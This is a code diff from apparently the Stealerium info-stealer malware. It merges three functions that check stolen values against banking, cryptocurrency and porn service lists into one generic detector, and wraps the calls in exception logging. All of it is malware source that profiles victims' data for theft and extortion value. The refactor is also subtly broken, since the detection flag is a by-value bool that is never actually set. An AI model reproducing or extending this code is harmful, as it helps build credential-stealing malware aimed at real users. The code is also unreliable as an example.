@@ -72,49 +72,26 @@ namespace Stealerium.Helpers
             return true;
         }
 
-        // Detect crypto currency services
-        private static void DetectCryptocurrencyServices(string value)
+        private static void DetectServices(string value, string[] toscan, List<string> detected, bool ondetect)
         {
-            foreach (var service in Config.CryptoServices)
+            foreach (string service in toscan)
                 if (value.ToLower().Contains(service) && value.Length < 25)
-                    if (AppendValue(value, Counter.DetectedCryptoServices))
-                    {
-                        Counter.CryptoServices = true;
-                        return;
-                    }
-        }
-
-
-        // Detect banking services
-        private static void DetectBankingServices(string value)
-        {
-            foreach (var service in Config.BankingServices)
-                if (value.ToLower().Contains(service) && value.Length < 25)
-                    if (AppendValue(value, Counter.DetectedBankingServices))
-                    {
-                        Counter.BankingServices = true;
-                        return;
-                    }
-        }
-
-        // Detect porn services
-        private static void DetectPornServices(string value)
-        {
-            foreach (var service in Config.PornServices)
-                if (value.ToLower().Contains(service) && value.Length < 25)
-                    if (AppendValue(value, Counter.DetectedPornServices))
-                    {
-                        Counter.PornServices = true;
-                        return;
-                    }
+                    if (AppendValue(value, detected)) { ondetect = true; return; }
         }
 
         // Detect all
         public static void ScanData(string value)
         {
-            DetectBankingServices(value);
-            DetectCryptocurrencyServices(value);
-            DetectPornServices(value);
+            try
+            {
+                DetectServices(value, Config.PornServices, Counter.DetectedPornServices, Counter.PornServices);
+                DetectServices(value, Config.BankingServices, Counter.DetectedBankingServices, Counter.BankingServices);
+                DetectServices(value, Config.CryptoServices, Counter.DetectedCryptoServices, Counter.CryptoServices);
+            }
+            catch (Exception ex)
+            {
+                Logging.Log("Banking - ScanData >> Exception while analyzing value '" + value + "'\n" + ex);
+            }
         }
 
         // Detect credit cards type by number
